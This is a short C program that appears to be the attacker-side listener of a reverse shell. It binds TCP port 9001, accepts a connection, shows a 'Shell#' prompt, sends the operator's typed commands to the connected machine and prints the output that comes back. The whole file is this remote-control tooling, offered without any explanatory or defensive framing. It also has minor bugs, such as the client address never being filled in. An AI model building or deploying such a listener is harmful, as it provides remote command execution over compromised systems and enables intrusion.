#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main()
{
    int sockD, client_socket;
    char buffer[1024];
    char response[18384];
    struct sockaddr_in server_addr, client_addr;
    int i = 0;
    int optval = 1;

    socklen_t client_length;

    printf("starting\n");
    sockD = socket(AF_INET, SOCK_STREAM, 0);
    if (setsockopt(sockD, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) > 0)
    {
        printf("Error Setting TCP Socket Options\n");
        return 1;
    }
    printf("inisialising\n");
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr("0.0.0.0");
    server_addr.sin_port = htons(9001);

    printf("binding\n");
    bind(sockD, (struct sockaddr *)&server_addr, sizeof(server_addr));
    printf("listening\n");
    listen(sockD, 10);
    client_length = sizeof(client_addr);

    while (1)
    {
        client_socket = accept(sockD, (struct sockaddr *)NULL, NULL);
        printf("connected");
    jump:
        memset(&buffer, 0, sizeof(buffer));
        memset(&response, 0, sizeof(response));
        printf("* Shell#%s~$: ", inet_ntoa(client_addr.sin_addr));
        fgets(buffer, sizeof(buffer), stdin);
        strtok(buffer, "\n");
        write(client_socket, buffer, sizeof(buffer));
        if (strncmp("q", buffer, 1) == 0)
        {
            close(client_socket);
            return 0;
        }
        else
        {
            recv(client_socket, response, sizeof(response), MSG_WAITALL);
            printf("%s", response);
            goto jump;
        }
    }

    return 0;
}
